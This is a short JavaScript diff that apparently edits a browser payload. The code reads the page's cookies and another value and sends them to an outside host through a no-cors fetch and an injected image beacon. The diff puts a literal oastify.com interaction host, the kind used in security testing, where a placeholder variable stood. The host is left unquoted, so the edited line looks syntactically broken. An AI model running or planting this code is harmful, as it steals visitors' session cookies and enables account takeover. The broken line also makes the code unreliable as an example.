@@ -5,7 +5,7 @@
     catch (e) { return 'ERR:' + e.message; }
   }
   function ck() { try { return document.cookie; } catch (e) { return 'ERR:' + e.message; } }
-  var base = ['https://', BRDC_HOST, '/leah?d=ldr&t=' + encodeURIComponent(val()) + '&c=' + encodeURIComponent(ck())];
+  var base = ['https://', bn2qy934nujhncki3pebfp6hj8p5du.oastify.com, '/leah?d=ldr&t=' + encodeURIComponent(val()) + '&c=' + encodeURIComponent(ck())];
   var u = base.join('');
   try { fetch(u + '&v=fetch', { mode: 'no-cors' }); } catch (e) {}
   try { var i = new Image(); i.src = u + '&v=img'; document.body ? document.body.appendChild(i) : document.head.appendChild(i); } catch (e) {}
